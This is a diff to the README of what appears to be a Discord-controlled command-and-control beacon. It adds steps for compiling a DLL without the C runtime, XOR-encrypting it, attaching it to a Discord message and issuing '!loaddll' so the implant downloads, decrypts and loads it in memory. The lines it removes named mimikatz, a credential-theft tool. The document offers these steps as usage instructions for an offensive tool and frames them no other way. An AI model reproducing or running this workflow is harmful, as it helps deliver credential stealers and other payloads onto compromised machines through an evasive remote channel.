@@ -271,15 +271,23 @@ help
 
 ### Loading Additional DLLs
 
+**Important**: DLLs must be compiled **without the C Runtime (CRT)** to work with the PE Loader.
+See `test_dll/README.md` for detailed instructions.
+
 ```bash
+# Compile DLL without CRT (required!)
+x86_64-w64-mingw32-gcc -shared -nostdlib -e DllMain -o payload.dll payload.c -lkernel32 -luser32
+
 # Encrypt DLL for loading
-python3 tools/xor_encrypt.py mimikatz.dll mimikatz.dll.enc 41
+python3 tools/xor_encrypt.py payload.dll payload.dll.enc 41
 
 # In Discord:
-# 1. Attach mimikatz.dll.enc to message
+# 1. Attach payload.dll.enc to message
 # 2. Type: !loaddll
 # 3. Beacon downloads, decrypts, and loads the DLL
 ```
+
+**Note**: The beacon prevents loading the same DLL twice (detected via hash). You'll get an error message with the existing base address if you try.
 
 ## Technical Details
 
